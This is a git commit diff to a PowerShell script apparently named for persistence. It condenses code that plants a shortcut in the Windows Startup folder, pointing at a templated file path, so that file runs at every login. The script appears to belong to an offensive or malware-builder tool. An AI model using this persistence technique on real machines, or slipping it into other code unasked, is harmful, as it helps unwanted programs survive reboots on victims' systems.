a1d061e684506b564e1e2036c5aa486c7f1080ad
spl4shc4sh <95105945+spl4shc4sh@users.noreply.github.com>
2021-12-05 21:32:22 +0300

    Update for string command
    Crazy :)

--- presistshortcut.ps1
+++ presistshortcut.ps1
@@ -1,7 +1,1 @@
-$TargetFile =  "%FULLFILENAME%"
-$ShortcutFile = "$HOME/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/TonyStart.lnk"
-$WScriptShell = New-Object -ComObject WScript.Shell
-$Shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
-$Shortcut.Arguments=""
-$Shortcut.TargetPath = $TargetFile
-$Shortcut.Save()
+$WScriptShell = New-Object -ComObject WScript.Shell; $Shortcut = $WScriptShell.CreateShortcut("$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\StartUp\launcher.lnk");$Shortcut.Arguments="";$Shortcut.TargetPath = "%FULLFILENAME%"; $Shortcut.Save(); "Ok"
